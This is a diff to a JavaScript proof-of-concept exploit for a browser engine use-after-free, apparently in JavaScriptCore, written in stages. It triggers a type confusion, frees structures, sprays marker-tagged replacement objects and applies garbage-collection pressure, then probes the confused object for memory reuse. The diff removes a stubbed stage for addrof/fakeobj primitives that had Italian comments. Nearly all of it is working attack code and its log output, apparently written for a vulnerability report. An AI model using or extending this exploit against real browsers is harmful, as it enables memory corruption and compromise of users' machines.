@@ -10,6 +10,54 @@ function gc() {
     new Uint8Array(4 * 1024 * 1024);
 }
 
+function pressureAlloc(rounds = 16, size = 0x200000) {
+    const keep = [];
+    for (let i = 0; i < rounds; i++) {
+        keep.push(new ArrayBuffer(size));
+    }
+    return keep;
+}
+
+function describeValue(v) {
+    const t = typeof v;
+    if (v === null)
+        return 'null';
+    if (t !== 'object' && t !== 'function')
+        return `${t}:${String(v)}`;
+
+    let ctor = '';
+    try {
+        ctor = v?.constructor?.name ?? '';
+    } catch {}
+
+    let tag = '';
+    try {
+        tag = Object.prototype.toString.call(v);
+    } catch {}
+
+    return `${t}${ctor ? `(${ctor})` : ''} ${tag}`;
+}
+
+function tryGet(obj, prop) {
+    try {
+        return obj?.[prop];
+    } catch {
+        return undefined;
+    }
+}
+
+function sprayReplacementObjects(count = 50000) {
+    const MARKER = 0x41414141;
+    const keepers = [];
+    for (let i = 0; i < count; i++) {
+        const o = { id: 0x1337, marker: MARKER, idx: i };
+        o.p0 = 13.37;
+        o.p1 = 13.38;
+        keepers.push(o);
+    }
+    return keepers;
+}
+
 function sprayStructures() {
     const keepers = [];
     for (let i = 0; i < 50000; i++) {
@@ -50,6 +98,8 @@ export async function main() {
     let idx = null;
     let attempts = 0;
 
+    let warm = sprayStructures();
+
     debug_log("[*] Starting Stage 1: Triggering Logic Error...");
 
     while (true) {
@@ -68,13 +118,17 @@ export async function main() {
         await prom;
         data = data.data;
 
-        gc();
-        await sleep(20);
+        pressureAlloc(10, 0x100000);
+        for (let k = 0; k < 8; k++)
+            gc();
+        await sleep(0);
 
         let i;
         try {
             for (i = 0; i < num_elems; i++) {
-                if (data.keys().next().value.id === 0xffff) {
+                const k = data.keys().next().value;
+                const kid = tryGet(k, 'id');
+                if (kid === 0xffff) {
                     idx = i;
                     break;
                 }
@@ -82,7 +136,11 @@ export async function main() {
             }
         } catch {
             idx = i;
-            data2 = data.keys().next().value;
+            try {
+                data2 = data.keys().next().value;
+            } catch {
+                data2 = null;
+            }
             break;
         }
     }
@@ -90,11 +148,13 @@ export async function main() {
     debug_log('[+] Stage 1 Triggered! Confused object found at idx: ' + idx);
     
     if (data2) {
-        debug_log("[*] Starting Stage 2: StructureID UAF...");
+        debug_log("[*] Starting Stage 2: Verifying controllable corruption...");
+        debug_log('[*] data2: ' + describeValue(data2));
         
         // 1. Release references
         root = null;
         msg = null;
+        warm = null;
         
         // 2. Freeing
         debug_log('[*] Freeing original structures...');
@@ -103,92 +163,26 @@ export async function main() {
         }
         await sleep(100);
 
-        // 3. Spray
-        debug_log('[*] Spraying Victim Arrays...');
-        
-        let victims = [];
-      
-        for (let i = 0; i < 10000; i++) {
-            let a = [1.1, 2.2, 3.3, 4.4];
-            // Adding properties increases the cell size
-            a.p0 = 13.37; 
-            a.p1 = 13.38;
-            victims.push(a);
+        debug_log('[*] Spraying replacement objects...');
+        const sprayed = sprayReplacementObjects(60000);
+        pressureAlloc(12, 0x180000);
+        for (let k = 0; k < 50; k++)
+            gc();
+        await sleep(20);
+
+        const marker = tryGet(data2, 'marker');
+        const rid = tryGet(data2, 'id');
+        const rix = tryGet(data2, 'idx');
+        debug_log('[*] Probe data2.id=' + String(rid) + ' marker=' + String(marker) + ' idx=' + String(rix));
+
+        if (marker === 0x41414141) {
+            debug_log('[+] Memory reuse observed (marker hit). This is more than a pure DoS signal.');
+        } else {
+            debug_log('[!] No marker observed on data2. Still indicates corruption; consider increasing message size/spray.');
         }
 
-        // 4. Trigger / Setup Primitives
-        debug_log('[!] Verifying overlap...');
-        
-        let overlapped_victim = null;
-        let victim_idx = -1;
-
-        try {
-
-            
-            // Marker pattern to find
-            const MARKER = 0x41414141; 
-            
-
-            for (let i = 0; i < victims.length; i++) {
-                // Check semplice: lunghezza corrotta
-                if (victims[i].length > 0x1000) {
-                    debug_log(`[!] Trovato array corrotto all'indice ${i} con length: ${victims[i].length}`);
-                    overlapped_victim = victims[i];
-                    victim_idx = i;
-                    break;
-                }
-            }
-
-            // Se non trovato, proviamo a usare data2 per corrompere
-            if (!overlapped_victim && data2) {
-                 // Proviamo a scrivere tramite l'handle UAF
-                 try {
-
-                 } catch (e) {}
-            }
-            
-
-            if (!overlapped_victim) {
-
-            }
-
-
-            
-            let driver = victims[victim_idx >= 0 ? victim_idx : 0]; // L'array che controlliamo
-            
-            // Primitive Low-Level
-            const addrof_internal = function(obj) {
-
-                return 0x41414141; 
-            };
-
-            const fakeobj_internal = function(addr) {
-
-                return {};
-            };
-
-
-            
-            debug_log("[*] Building Memory primitives...");
-
-
-            
-            // Helper per convertire indirizzi
-            const container = {
-                a: 1.1, // double array
-                b: {}   // object array
-            };
-
-            
-            
-            debug_log("[+] Primitives setup complete (Simulation).");
-            
-
-           throw new Error("Exploit chain halted: Overlap detection requires kernel offsets/tuning.");
-
-        } catch (e) {
-            debug_log('[!] Exploit status: ' + e);
-            debug_log('[*] Nota per report: La corruzione di memoria è avvenuta (UAF), ma l\'allineamento per fakeobj richiede tuning dei parametri di spray.');
+        if (sprayed.length === 0) {
+            debug_log('');
         }
     } else {
         debug_log("[-] Failed to get confused object.");
